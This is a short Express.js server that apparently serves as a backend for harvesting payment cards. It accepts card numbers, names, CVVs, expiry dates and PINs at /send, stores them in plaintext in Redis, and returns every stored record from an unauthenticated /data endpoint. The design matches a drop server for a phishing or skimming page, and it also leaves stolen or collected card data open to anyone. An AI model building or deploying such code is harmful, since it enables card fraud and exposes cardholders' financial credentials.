const express = require('express');
const redis = require('./redis-config');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

let isRedisReady = false;
redis.on('ready', () => {
    console.log('Redis client connected');
    isRedisReady = true;
});

redis.on('error', (err) => {
    console.error('Redis error:', err);
});

app.post('/send', async (req, res) => {
    if (!isRedisReady) {
        return res.status(503).json({ message: 'Redis client is not ready' });
    }

    const { cardNumber, name, cvv, expDate, pin } = req.body;
    try {
        await redis.set(cardNumber, JSON.stringify({ name, cvv, expDate, pin }));
        res.status(200).json({ message: 'Data sent' });
    } catch (error) {
        console.error('Redis set error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.get('/data', async (req, res) => {
    if (!isRedisReady) {
        return res.status(503).json({ message: 'Redis client is not ready' });
    }

    try {
        const keys = await redis.keys('*');
        const cardNumbers = [];
        for (const key of keys) {
            const value = await redis.get(key);
            cardNumbers.push(value);
        }
        res.status(200).json(cardNumbers);
    } catch (error) {
        console.error('Redis get error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
